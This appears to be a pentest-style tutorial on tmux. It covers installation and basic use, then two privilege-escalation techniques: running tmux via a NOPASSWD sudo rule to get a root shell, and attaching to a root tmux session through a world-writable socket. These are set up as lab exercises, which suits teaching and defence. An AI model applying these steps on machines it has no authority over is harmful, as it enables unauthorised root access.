# Tmux Privilege

* ## [OverView](#overview)

* ## [How to install](#install)

* ## [How it work](#work)

* ## [Privilege Escalation with Sudo](#sudo)

* ## [Hijacking Tmux Sessions](#hijacking)

## OverView <a name="overview"></a>

`Tmux` is an open-source *terminal multiplexer* for `Unix-like` operating systems. It allows multiple terminal sessions to be accessed simultaneously in a single window. It is useful for running more than one command-line program at the same time. It can also be used to detach processes from their controlling terminals, allowing remote sessions to remain active without being visible

`Tmux` includes most features of GNU Screen. It allows users to start a terminal session with clients that are not bound to a specific physical or virtual console; multiple terminal sessions can be created within a single terminal session and then freely rebound from one virtual console to another, and each session can have several connected clients.

## How to install `Tmux` <a name="install"></a>
* Installing Tmux on Ubuntu and Debian
> sudo apt install tmux

* Installing Tmux on CentOS and Fedora
> sudo yum install tmux

* Installing Tmux on macOS 
> brew install tmux

## How it works <a name="work"></a>

For detailed instructions we can use.
> tmux -h

![image](https://user-images.githubusercontent.com/63194321/147381941-723550ba-4e5a-4e3e-83d7-67531634d701.png)


You can start `tmux` using the terminal:

> tmux

![image](https://user-images.githubusercontent.com/63194321/147381788-2c6a021f-0ea9-4d69-b79d-00e0c02c4578.png)

Create a new session with your own name:

> tmux new -s <session_name>

list available sessions:

> tmux ls

*In addition, when entering the GUI of `tmux` you can find out more at [Tmux cheat sheet](https://quickref.me/tmux)*

## Tmux Privilege Escalation

### Privilege Escalation with `Sudo` <a name="sudo"></a>

#### Set up:
In Linux there is a configuration file for sudo privileges located at “/etc/sudoers”.
This is the file that administrators allocate system permissions to
used in the system. When the user wants to run administrator privileges
through the "sudo" command, through the "/etc/sudoers" file, the OS will know that the user has the right
run that command or not

Open the file `/etc/sudoers` add the following at the end of the file.
> \<user_name> ALL=(root) NOPASSWD: /usr/bin/tmux
  
  ![image](https://user-images.githubusercontent.com/63194321/147391149-d7c315b8-209f-49b2-89df-9158e6c0f96f.png)

#### Deploy

**Step1:** Find a way to get into the operating system (SSH, RCE,..)

**Step2:** After gaining access to the victim machine check the permissions on the victim account.Found the victim's account to have access to tmux with `sudo` without a password.
> sudo -l

![image](https://user-images.githubusercontent.com/63194321/147391232-b07f1f08-3731-408f-819c-379749f829f6.png)

**Step3:** After defining a user with `sudo` privileges, it can be easily elevated with `tmux`.
> sudo tmux

![image](https://user-images.githubusercontent.com/63194321/147391314-6215611d-120c-4973-8b27-bc0bb90d4f7e.png)

### Hijacking Tmux Sessions <a name="hijacking"></a>
#### Set Up

* Create a forder `test/test1` at `tmp`
> mkdir /tmp/test
> touch /tmp/test/test1

* User `root` uses `tmux` to execute run at folder `/tmp/test/test1`.
> tmux -S /tmp/test/test1

(*The -S flag can be used to specify an alternative path to the server socket used for the shell session. If is specified, the default socket directory (which is normally /tmp/tmux-[user id]) is not used. If a non-privileged user has access to the socket, they could attach to the running session, thus gaining the same privileges as the user running the Tmux shell.*)

![image](https://user-images.githubusercontent.com/63194321/147391758-d25abe66-dcba-49c5-9571-9c689a71f361.png)

* Make permission for the directory `/tmp/test/test1` so that everyone has full editing permission.
> chmod 777 /tmp/test/test1

![image](https://user-images.githubusercontent.com/63194321/147391950-23d9de65-1abc-4d91-9b62-49142dd68260.png)

#### Deploy

**Step1:** Through SSH or RCE we access in the OS.

**Step2:** After accessing in `os` we proceed to check the running processes of the system.
> ps -ef

![image](https://user-images.githubusercontent.com/63194321/147391860-2b81bb86-5474-4bbc-b5ce-aa9bf71f7d12.png)

**Step3:** Check if there is a process running `Tmux`?
> ps -ef | grep tmux

![image](https://user-images.githubusercontent.com/63194321/147391886-6f4a16ae-7728-45d2-afdf-6ffe8c885862.png)

**Step4:** We see that there is a process running `tmux -S /tmp/test/test1` with the root user.

**Step5:** Check the permissions of the directory `/tmp/test/test1`.
> ls -l /tcp/test/test1

![image](https://user-images.githubusercontent.com/63194321/147391958-d82df6ed-40b7-4527-8a15-936bf718e608.png)

Looking at the file permissions, all users have read and write permissions on the directory.

**Step6:** Looking at the file permissions, all users have read and write permissions on the directory.
> tmux -S /tmp/test/test1 

![image](https://user-images.githubusercontent.com/63194321/147392044-fcc26050-6558-400d-94cc-13ebb73bf509.png)


### Reference 

[https://viblo.asia/p/gioi-thieu-co-ban-ve-tmux-zoZVRgLEMmg5](https://viblo.asia/p/gioi-thieu-co-ban-ve-tmux-zoZVRgLEMmg5)

[https://www.joyk.com/dig/detail/1562877072279933](https://www.joyk.com/dig/detail/1562877072279933)

[https://www.hackingarticles.in/linux-for-pentester-tmux-privilege-escalation/](https://www.hackingarticles.in/linux-for-pentester-tmux-privilege-escalation/)

[https://steflan-security.com/linux-privilege-escalation-exploiting-shell-sessions/](https://steflan-security.com/linux-privilege-escalation-exploiting-shell-sessions/)







